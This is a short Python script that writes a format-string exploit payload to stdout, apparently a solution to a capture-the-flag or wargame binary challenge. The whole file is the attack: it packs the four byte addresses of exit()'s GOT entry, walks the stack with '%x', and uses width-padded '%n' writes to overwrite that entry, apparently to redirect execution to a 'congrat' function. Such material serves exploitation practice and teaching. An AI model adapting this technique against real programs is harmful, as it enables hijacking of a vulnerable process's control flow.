#!/usr/bin/python
#We did the one on i486 because problem with bytes
import struct
import sys

exit_got_addr1 = struct.pack("I",0x80497e4)
exit_got_addr2 = struct.pack("I",0x80497e5)
exit_got_addr3 = struct.pack("I",0x80497e6)
exit_got_addr4 = struct.pack("I",0x80497e7)
#addr_of_congrat = 0x8048503
bytes_to_write = "%x|" * 10 + "%168x" +  "%n" + "%386x" + "%n" + "%127x" + "%n" + "%260x" + "%n"
exploit = exit_got_addr1 + "AAAA" + exit_got_addr2 + "AAAA" + exit_got_addr3 + "AAAA" + exit_got_addr4 + bytes_to_write
sys.stdout.write(exploit)
